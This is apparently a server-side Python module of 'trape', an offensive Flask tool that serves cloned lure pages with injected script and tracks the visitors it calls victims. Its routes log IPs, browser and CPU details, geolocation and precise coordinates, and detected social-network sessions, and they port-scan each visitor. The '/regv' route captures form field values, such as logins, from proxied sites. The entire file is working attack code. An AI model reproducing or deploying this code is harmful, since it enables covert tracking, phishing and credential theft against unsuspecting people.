#!/usr/bin/env python
# -*- coding: utf-8 -*-
#**
#
#########
# trape #
#########
#
# trape depends of this file
# For full copyright information this visit: https://github.com/boxug/trape
#
# Copyright 2017 by boxug / <hey@boxug.com>
#**
import time
import urllib2
from flask import Flask, render_template, session, request, json
from core.victim_objects import *
import core.stats
from core.utils import utils
from core.db import Database


# Main parts, to generate relationships among others
trape = core.stats.trape
app = core.stats.app

# call database
db = Database()

class victim_server(object):
    @app.route("/" + trape.victim_path)
    def homeVictim():
        opener = urllib2.build_opener()
        headers = victim_headers(request.user_agent)
        opener.addheaders = headers
        html = victim_inject_code(opener.open(trape.url_to_clone).read(), 'lure')
        return html

    @app.route("/register", methods=["POST"])
    def register():
        vId = request.form['vId']
        if vId == '':
          vId = utils.generateToken(5)

        victimConnect = victim(vId, request.environ['REMOTE_ADDR'], request.user_agent.platform, request.user_agent.browser, request.user_agent.version,  utils.portScanner(request.environ['REMOTE_ADDR']), request.form['cpu'], time.strftime("%Y-%m-%d - %H:%M:%S"))
        victimGeo = victim_geo(vId, 'city', request.form['countryCode'], request.form['country'], request.form['query'], request.form['lat'], request.form['lon'], request.form['org'], request.form['region'], request.form['regionName'], request.form['timezone'], request.form['zip'], request.form['isp'], str(request.user_agent))

        utils.Go(utils.Color['white'] + "[" + utils.Color['blueBold'] + "*" + utils.Color['white'] + "]" + " A victim has been connected from " + utils.Color['blue'] + victimGeo.ip + utils.Color['white'] + ' with the following identifier: ' + utils.Color['green'] + vId + utils.Color['white'])
        cant = int(db.sentences_victim('count_times', vId, 3, 0))

        db.sentences_victim('insert_click', [vId, trape.url_to_clone, time.strftime("%Y-%m-%d - %H:%M:%S")], 2)
        db.sentences_victim('delete_networks', [vId], 2)

        if cant > 0:
            utils.Go(utils.Color['white'] + "[" + utils.Color['blueBold'] + "*" + utils.Color['white'] + "]" + " " + "It\'s his " + str(cant + 1) + " time")
            db.sentences_victim('update_victim', [victimConnect, vId, time.time()], 2)
            db.sentences_victim('update_victim_geo', [victimGeo, vId], 2)
        else:
            utils.Go(utils.Color['white'] + "[" + utils.Color['blueBold'] + "*" + utils.Color['white'] + "]" + " " + "It\'s his first time")
            db.sentences_victim('insert_victim', [victimConnect, vId, time.time()], 2)
            db.sentences_victim('insert_victim_geo', [victimGeo, vId], 2)
        return json.dumps({'status' : 'OK', 'vId' : vId});

    @app.route("/nr", methods=["POST"])
    def networkRegister():
        vId = request.form['vId']
        vIp = request.form['ip']
        vnetwork = request.form['red']
        if vId == '':
          vId = utils.generateToken(5)
        utils.Go(utils.Color['white'] + "[" + utils.Color['greenBold'] + "+" + utils.Color['white'] + "]" + utils.Color['whiteBold'] + " " + vnetwork + utils.Color['white'] + " session detected from " + utils.Color['blue'] + vIp + utils.Color['white'] + ' ' + "with ID: " + utils.Color['green'] + vId + utils.Color['white'])

        cant = int(db.sentences_victim('count_victim_network', [vId, vnetwork], 3, 0))

        if cant > 0:
            db.sentences_victim('update_network', [vId, vnetwork, time.strftime("%Y-%m-%d - %H:%M:%S")], 2)
        else:
            db.sentences_victim('insert_networks', [vId, vIp, request.environ['REMOTE_ADDR'], vnetwork, time.strftime("%Y-%m-%d - %H:%M:%S")], 2)
        return json.dumps({'status' : 'OK', 'vId' : vId});

    @app.route("/lr", methods=["POST"])
    def locationRegister():
        vId = request.form['vId']
        lat = request.form['lat']
        lon = request.form['lon']

        db.sentences_victim('location_victim', [vId, lat, lon], 2)
        return json.dumps({'status' : 'OK', 'vId' : vId});

    @app.route("/redv")
    def redirectVictim():
        url = request.args.get('url')
        opener = urllib2.build_opener()
        headers = victim_headers(request.user_agent)
        opener.addheaders = headers
        html = victim_inject_code(opener.open(url).read(), 'vscript')
        return html

    @app.route("/regv", methods=["POST"])
    def registerRequest():
        vrequest = victim_request(request.form['vId'], request.form['site'], request.form['fid'], request.form['name'], request.form['value'], request.form['sId'])
        db.sentences_victim('insert_requests', [vrequest, time.strftime("%Y-%m-%d - %H:%M:%S")], 2)
        utils.Go(utils.Color['white'] + "[" + utils.Color['greenBold'] + "=" + utils.Color['white'] + "]" + " " + 'Receiving data from: ' + utils.Color['green'] + vrequest.id + utils.Color['white']  + ' ' + 'on' + ' ' + utils.Color['blue'] + vrequest.site + utils.Color['white'] + '\t\n' + vrequest.fid + '\t' + vrequest.name + ':\t' + vrequest.value)
        return json.dumps({'status' : 'OK', 'vId' : vrequest.id});

    @app.route("/tping", methods=["POST"])
    def receivePing():
        vrequest = request.form['id']
        db.sentences_victim('report_online', [vrequest], 2)
        return json.dumps({'status' : 'OK', 'vId' : vrequest});
